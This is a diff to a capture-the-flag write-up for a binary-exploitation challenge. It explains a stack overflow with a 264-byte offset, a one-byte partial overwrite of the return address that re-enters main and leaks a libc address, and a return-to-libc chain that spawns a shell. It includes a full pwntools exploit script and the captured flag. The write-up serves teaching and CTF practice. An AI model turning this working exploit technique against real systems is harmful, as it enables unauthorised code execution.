@@ -1455,10 +1455,133 @@ Since that's the only variable present on the stack frame the difference between
 
 The 8 comes from the fact that the saved rbp is present therefore the offset is `264`
 
+Ok now what?
 
+Before the program prints our input here's how the stack looks like
+![image](https://github.com/user-attachments/assets/09b7ee7d-3665-4606-932a-fe9d83de5d60)
 
+We can see that after our input there's a libc address next to it
 
+Checking it shows it's `__libc_start_call_main+128`
+![image](https://github.com/user-attachments/assets/8e52ac30-03e8-45c2-9e17-e900716ff8f5)
 
+And that address is basically where the prorgam is going to return too after it `ret`
+![image](https://github.com/user-attachments/assets/2fc0a070-84c2-441b-8006-f4da30047a1a)
+
+What we can do here is to perform partial overwrite such that instead of it returning to `__libc_start_call_main+28` it would return to `main`
+
+How can we do that when the address isn't even in the executable memory region?
+
+One thing you should know is that before `main` is called, `__libc_start_call_main` actually calls it
+
+So we just need to overwrite the lsb to the part where it's about to call `main`
+
+Here's the disassembly
+![image](https://github.com/user-attachments/assets/6fb8c73b-1d23-4234-8f9b-d99f57afcee0)
+
+And from debugging you can confirm that it does indeed call main that's why the main stack frame tends to return to the next address after the `call` instruction
+![image](https://github.com/user-attachments/assets/0ba7ca46-413f-4941-857d-e740141204f3)
+
+So now what?
+
+Well we just overwrite the lsb to `0x66` since that's where the setup starts
+![image](https://github.com/user-attachments/assets/c2b85f9f-d2d5-4171-8e39-50db7bc17e19)
+
+Doing that we can see that it not only jumps back to main but also leaks the address of `__libc_start_call_main+102`
+![image](https://github.com/user-attachments/assets/356fba0f-2497-4063-bc90-be30771f1c94)
+
+So we can use that to calculate the libc base address then perform rop to spawn a shell using this:
+
+```
+pop rdi
+/bin/sh
+ret
+system
+```
+
+Here's my final exploit
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('vuln_patched')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+libc = exe.libc
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+breakrva 0x01269
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    offset = 264
+
+    payload = b'a'*offset
+    payload += p8(0x66)
+
+    io.send(payload)
+
+    io.recvuntil(b'a'*offset)
+    leak = u64(io.recv(6).ljust(8, b'\x00'))
+    libc.address = leak - 0x29d66
+
+    info("libc base: %#x", libc.address)
+
+    pop_rdi = libc.address + 0x2a3e5 # pop rdi ; ret
+    sh = next(libc.search(b'/bin/sh\x00'))
+    ret = libc.address + 0x29cd6 # ret
+    system = libc.sym['system']
+
+    payload = b'a'*offset
+    payload += p64(pop_rdi)
+    payload += p64(sh)
+    payload += p64(ret)
+    payload += p64(system)
+
+    io.sendline(payload)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it works
+![image](https://github.com/user-attachments/assets/4a36337e-34d3-45c9-8d75-ac0c831a5d73)
+
+```
+Flag: ictf{im_really_out_of_format_string_ideas.}
+```
 
 
 
